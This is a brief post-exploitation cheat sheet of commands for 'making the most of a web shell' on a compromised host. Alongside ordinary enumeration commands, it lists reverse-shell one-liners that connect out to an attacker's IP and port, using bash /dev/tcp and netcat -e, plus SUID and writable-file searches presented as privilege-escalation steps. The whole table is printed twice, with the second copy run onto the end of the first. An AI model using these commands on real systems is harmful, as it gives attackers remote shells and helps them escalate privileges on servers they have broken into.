# December 3, 2024

The following table provides useful command for making the most of a web shell.
Command 	Use
ls 	Will give you an idea of what files/directories surround you
cat	A command used to output the contents of documents such as text files
pwd 	Will give you an idea of where in the system you are
whoami 	Will let you know who you are in the system
hostname 	The system name and potentially its role in the network
uname -a 	Will give you some system information like the OS, kernel version, and more
id 	If the current user is assigned to any groups
ifconfig 	Allows you to understand the system's network setup
bash -i >& /dev/tcp/<your-ip>/<port> 0>&1 	A command used to begin a reverse shell via bash
nc -e /bin/sh <your-ip> <port> 	A command used to begin a reverse shell via Netcat
find / -perm -4000 -type f 2>/dev/null 	Finds SUID (Set User ID) files, useful in privilege escalation attempts as it can sometimes be leveraged to execute binary with privileges of its owner (which is often root)
find / -writable -type  f 2>/dev/null | grep -v "/proc/" 	Also helpful in privilege escalation attempts used to find files with writable permissionsCommand 	Use
ls 	Will give you an idea of what files/directories surround you
cat	A command used to output the contents of documents such as text files
pwd 	Will give you an idea of where in the system you are
whoami 	Will let you know who you are in the system
hostname 	The system name and potentially its role in the network
uname -a 	Will give you some system information like the OS, kernel version, and more
id 	If the current user is assigned to any groups
ifconfig 	Allows you to understand the system's network setup
bash -i >& /dev/tcp/<your-ip>/<port> 0>&1 	A command used to begin a reverse shell via bash
nc -e /bin/sh <your-ip> <port> 	A command used to begin a reverse shell via Netcat
find / -perm -4000 -type f 2>/dev/null 	Finds SUID (Set User ID) files, useful in privilege escalation attempts as it can sometimes be leveraged to execute binary with privileges of its owner (which is often root)
find / -writable -type  f 2>/dev/null | grep -v "/proc/" 	Also helpful in privilege escalation attempts used to find files with writable permissions
